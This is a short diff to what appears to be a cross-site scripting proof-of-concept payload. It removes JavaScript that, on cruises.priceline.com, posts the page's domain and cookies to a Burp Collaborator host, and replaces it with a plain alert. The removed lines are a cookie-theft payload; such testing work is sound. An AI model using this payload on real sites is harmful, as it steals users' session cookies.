@@ -1,7 +1,1 @@
-if(document.domain=="cruises.priceline.com"){
-fetch('https://g9qr8ky9ca375d3ykznake9rjip8dx.burpcollaborator.net', {
-method: 'POST',
-mode: 'no-cors',
-body:document.domain+document.cookie
-});
-}
+alert("worked man")
